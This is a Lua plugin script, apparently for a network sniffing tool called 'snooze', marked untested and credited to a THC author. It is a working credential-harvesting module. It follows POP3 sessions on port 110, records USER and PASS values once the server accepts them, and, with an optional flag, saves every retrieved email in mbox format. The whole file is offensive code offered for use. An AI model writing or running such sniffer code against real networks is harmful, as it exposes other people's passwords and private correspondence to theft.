-- :pop3:110:tcp:
-- UNTESTED
-- AUTHOR: 0xdb04de66, rd@thc.org

-- enable/disable logging email (in mbox format). Set to "1" to enable.
maillog = 0

b = snooze.get()

if b == nil or b == "" then
	snooze.set("USER")
	return
end

c = string.sub(b, 1, 4)
b_cut = string.sub(b, 5)

function fn_user()
	x = snooze.get_server()
	t = string.sub(x, 1, 4)
	if t == "USER" then
		snooze.set("USE2" .. string.sub(x, 6))
		return
	end
end

function fn_user2()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "+OK" then
		snooze.set("PASS" .. b_cut)
		return
	end
end

function fn_pass()
	x = snooze.get_server()
	t = string.sub(x, 1, 4)
	if t == "PASS" then
		snooze.set("PAS2" .. string.sub(x, 6) .. b_cut)
		return
	end

	if t == "USER" then
		snooze.set("USE2" .. string.sub(x, 6))
		return
	end
end

function fn_pass2()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "-ER" then
		snooze.set ("USER")
		return
	end

	if t == "+OK" then
		if maillog == 1 then
			snooze.save("POP3\n" ..  b_cut .. "\n\n----EMAILS----\n")
			snooze.set ("RETR")
		else
			snooze.save("POP3\n" .. b_cut)
			snooze.finished()
		end
		
		return
	end
end

function fn_retr()
	x = snooze.get_server()
	t = string.sub(x, 1, 4)
	if t == "RETR" then
		snooze.set("RET2")
		return
	end
	
	if t == "QUIT" then
		snooze.finished()
	end
end

function ffrom(s)
	_,_,f = string.find(s, "\r\nFrom: (.-)\r\n")

	if f then
		_,_,f = string.find(f, "([%w_%-%.]*@[%w_%-%.]*)")
	end
	
	if not f then
		f = "MAILER-DAEMON"
	end

	return f
end

function cleanup(s, fl)
	if fl == 1 then
		_,j = string.find(s, "\r\n\r\n")
		x = string.sub(s, 1, j)
		y = string.sub(s, j+1)
	else
		x = ""
		y = s
	end
		
	y = string.gsub (y, "\r\n%.%.", "\r\n%.")
	y = string.gsub (y, "\r\nFrom%s", "\r\n>From%s")

	return x .. y
end

function fn_retr2()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "-ER" then
		snooze.set ("RETR")
		return
	end

	if t == "+OK" then
		_,j = string.find(x, "\n")
		x = string.sub(x, j+1)
		
		i,_ = string.find(x, "\r\n%.\r\n")
		if i then
			x = string.sub(x, 1, i+1) .. "\r\n"
			snooze.set ("RETR")
		else
			snooze.set ("RET3")
		end
		
		f = "From " .. ffrom(x) .. " Mon Jan 01 00:00:00 1970\r\n"
		
		snooze.save(f .. cleanup(x,1))
	end
end

function fn_retr3()
	x = snooze.get_client()

	i,_ = string.find(x, "\r\n%.\r\n")
	if i then
		x = string.sub(x, 1, i+1) .. "\r\n"
		snooze.set ("RETR")
	end
		
	snooze.save(cleanup(x,0))
end

state_fns = {
	["USER"] = fn_user,
	["USE2"] = fn_user2,
	["PASS"] = fn_pass,
	["PAS2"] = fn_pass2,
	["RETR"] = fn_retr,
	["RET2"] = fn_retr2,
	["RET3"] = fn_retr3,
}

state_fns[c]()

